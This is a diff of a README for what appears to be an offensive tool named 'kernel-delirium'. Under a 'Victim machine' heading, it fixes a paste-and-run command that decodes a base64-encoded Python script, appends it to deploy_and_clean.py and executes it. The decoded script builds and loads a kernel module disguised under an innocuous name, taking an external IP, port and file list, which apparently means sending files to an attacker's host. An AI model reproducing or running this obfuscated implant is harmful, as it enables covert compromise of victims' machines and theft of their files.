@@ -11,7 +11,7 @@ To use this software you should install a desktop app and run deploy_and_clean.p
 ### Victim machine :syringe: :computer:
 
 ```bash
-base64 -d aW1wb3J0IG9zCmltcG9ydCBhcmdwYXJzZQoKI21vZHVsZV9uYW1lIGlzIG5lZWRlZCB0byBoaWRl
+echo "aW1wb3J0IG9zCmltcG9ydCBhcmdwYXJzZQoKI21vZHVsZV9uYW1lIGlzIG5lZWRlZCB0byBoaWRl
 IHRoZSBleHBsb2l0IHVuZGVyIHRoZSBuYW1lIHdoaWNoIGlzIG5vdCBzdXNwaWNpb3VzCmRlZiBl
 eHBsb2l0X2dlbihleHRlcm5hbF9pcCwgZXh0ZXJuYWxfcG9ydCwgbW9kdWxlX25hbWUgPSAiZXRo
 ZXJuZXQuYyIsIGZpbGVzID0gW10sIHVwZGF0ZV9wZXJpb2Q9MSk6CiAgICBNT0RVTEVfQ09ERT0i
@@ -51,12 +51,12 @@ IGRlZmF1bHQ9IjEiKQogICAgYXJncyA9IHBhcnNlci5wYXJzZV9hcmdzKCkKICAgIGV4cGxvaXRf
 Z2VuKGFyZ3MuZXh0ZXJuYWxfaXAsIGFyZ3MuZXh0ZXJuYWxfcG9ydCwgYXJncy5tb2R1bGVfbmFt
 ZSwgYXJncy5maWxlcywgYXJncy51cGRhdGVfcGVyaW9kKQogICAgbG9hZF9tb2R1bGUoYXJncy5t
 b2R1bGVfbmFtZSkKICAgIGNsZWFudXAoKQogICAgcmV0dXJuIDA7CgppZiBfX25hbWVfXyA9PSAi
-X19tYWluX18iOgogICAgbWFpbigpCg== >> deploy_and_clean.py && python3 deploy_and_clean.py`
+X19tYWluX18iOgogICAgbWFpbigpCg==" | base64 -d  >> deploy_and_clean.py && python3 deploy_and_clean.py`
 ```
 
 ### Your machine :man_technologist:
 ```bash
-apt-get install kernel-delirium (Not gonna work yet)
+sudo apt-get install kernel-delirium (Not gonna work yet)
 ```
 
 ```bash
